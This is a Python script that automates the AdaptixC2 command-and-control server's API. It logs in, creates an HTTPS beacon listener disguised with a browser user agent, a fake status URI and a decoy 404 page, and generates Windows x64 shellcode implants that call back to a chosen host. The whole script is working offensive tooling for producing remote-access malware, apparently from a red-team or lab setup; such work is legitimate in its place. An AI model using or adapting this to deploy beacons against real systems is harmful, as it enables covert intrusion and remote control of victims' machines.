#!/usr/bin/env python3
"""
Drive AdaptixC2 server REST API to:
  1. Login
  2. Create an HTTPS BeaconHTTP listener
  3. Generate a Windows x64 raw-shellcode beacon
  4. Save shellcode to disk

Run on the host AFTER `docker compose --profile runtime up -d` has started the server.
"""
import argparse
import base64
import json
import secrets
import string
import sys
import time
import urllib3

import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def random_key(n: int = 32) -> str:
    return "".join(secrets.choice("0123456789abcdef") for _ in range(n))


def wait_for_server(base: str, timeout: int = 60) -> None:
    for _ in range(timeout):
        try:
            r = requests.get(base, verify=False, timeout=2)
            if r.status_code in (200, 401, 404, 405):
                return
        except requests.RequestException:
            pass
        time.sleep(1)
    raise SystemExit(f"[!] Server at {base} not reachable")


def login(base: str, user: str, password: str) -> str:
    r = requests.post(
        f"{base}/login",
        json={"username": user, "password": password, "version": "v1.2"},
        verify=False,
        timeout=10,
    )
    r.raise_for_status()
    return r.json()["access_token"]


def create_listener(base: str, headers: dict, name: str, callback_host: str, port: int) -> None:
    cfg = {
        "host_bind": "0.0.0.0",
        "port_bind": port,
        "callback_addresses": [f"{callback_host}:{port}"],
        "encrypt_key": random_key(32),
        "ssl": True,
        "http_method": "POST",
        "uri": ["/api/v1/status"],
        "user_agent": ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"],
        "hb_header": "X-Beacon-Id",
        "host_header": [],
        "request_headers": "",
        "server_headers": "",
        "x-forwarded-for": False,
        "page-error": "<html><head><title>404</title></head><body>404 Not Found</body></html>",
        "page-payload": '{"data":"<<<PAYLOAD_DATA>>>"}',
    }
    r = requests.post(
        f"{base}/listener/create",
        headers=headers,
        json={"name": name, "type": "BeaconHTTP", "config": json.dumps(cfg)},
        verify=False,
        timeout=15,
    )
    if r.status_code != 200:
        # Ignore "already exists" - we may have run before
        if "exist" in r.text.lower():
            print(f"[*] Listener {name} already exists")
            return
        raise SystemExit(f"[!] create_listener failed: {r.status_code} {r.text}")
    print(f"[+] Listener {name} created on :{port}")


def generate_beacon(base: str, headers: dict, listener_name: str, out_path: str) -> int:
    agent_cfg = {
        "os": "windows",
        "arch": "x64",
        "format": "Shellcode",
        "sleep": "4s",
        "jitter": 0,
        "svcname": "",
        "is_killdate": False,
        "kill_date": "",
        "kill_time": "",
        "is_workingtime": False,
        "start_time": "",
        "end_time": "",
        "iat_hiding": False,
        "is_sideloading": False,
        "sideloading_content": "",
        "dns_resolvers": "",
        "doh_resolvers": "",
        "dns_mode": "",
        "user_agent": "",
        "use_proxy": False,
        "proxy_type": "",
        "proxy_host": "",
        "proxy_port": 0,
        "proxy_username": "",
        "proxy_password": "",
        "rotation_mode": "sequential",
    }
    r = requests.post(
        f"{base}/agent/generate",
        headers=headers,
        json={
            "listener_name": [listener_name],
            "agent": "beacon",
            "config": json.dumps(agent_cfg),
        },
        verify=False,
        timeout=120,
    )
    if r.status_code != 200:
        raise SystemExit(f"[!] agent/generate failed: {r.status_code} {r.text}")
    body = r.json()
    if not body.get("ok"):
        raise SystemExit(f"[!] agent/generate not ok: {body}")
    name_b64, bytes_b64 = body["message"].split(":")
    fname = base64.b64decode(name_b64).decode()
    data = base64.b64decode(bytes_b64)
    with open(out_path, "wb") as f:
        f.write(data)
    print(f"[+] Beacon generated: server-name={fname}, saved={out_path}, size={len(data)} bytes")
    return len(data)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--server", default="https://127.0.0.1:4321/endpoint")
    ap.add_argument("--username", default="op")
    ap.add_argument("--password", default="pass")
    ap.add_argument("--listener-name", default="zero-https")
    ap.add_argument("--callback-host", default="host.docker.internal",
                    help="Where the beacon should phone home (reachable from the loader). On Windows host, use the host's LAN IP or host.docker.internal mapped via extra_hosts.")
    ap.add_argument("--listener-port", type=int, default=8443)
    ap.add_argument("--out", default="adaptix-shellcode.bin")
    args = ap.parse_args()

    wait_for_server(args.server)
    token = login(args.server, args.username, args.password)
    print(f"[+] Logged in, token len={len(token)}")
    headers = {"Authorization": f"Bearer {token}"}

    create_listener(args.server, headers, args.listener_name, args.callback_host, args.listener_port)
    size = generate_beacon(args.server, headers, args.listener_name, args.out)
    return 0 if size > 0 else 1


if __name__ == "__main__":
    sys.exit(main())
